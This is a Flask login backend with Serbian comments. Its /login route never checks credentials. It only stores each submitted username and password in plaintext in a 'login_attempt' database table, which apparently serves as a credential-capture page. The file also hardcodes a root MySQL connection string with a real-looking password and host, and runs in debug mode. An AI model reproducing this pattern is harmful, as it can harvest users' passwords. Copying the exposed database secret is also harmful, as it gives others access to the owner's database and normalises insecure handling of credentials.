 from flask import Flask, render_template, request, redirect, url_for, flash
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker

app = Flask(__name__)
app.secret_key = "your_secret_key"

DATABASE_URL = "mysql+pymysql://root:aiBzbPEEvtrurGaPrXjVZWgdVDjgABbt@maglev.proxy.rlwy.net:50172/railway"

# Povezivanje s bazom
engine = create_engine(DATABASE_URL)
Session = sessionmaker(bind=engine)
session = Session()

# Provera konekcije
try:
    with engine.connect() as connection:
        connection.execute(text("SELECT 1"))
    print("✅ Baza podataka je uspešno povezana i tabele su kreirane!")
except Exception as e:
    print(f"❌ GREŠKA pri povezivanju na bazu: {e}")

# Rute
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    try:
        with engine.connect() as connection:
            # Ubacivanje login pokušaja u login_attempt tabelu
            insert_query = text("""
                INSERT INTO login_attempt (username, password, attempt_time) 
                VALUES (:username, :password, NOW())
            """)
            connection.execute(insert_query, {"username": username, "password": password})

            flash('Login attempt saved to database!', 'success')
            return redirect(url_for('index'))

    except Exception as e:
        flash(f'Greška pri prijavljivanju: {e}', 'error')
        return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)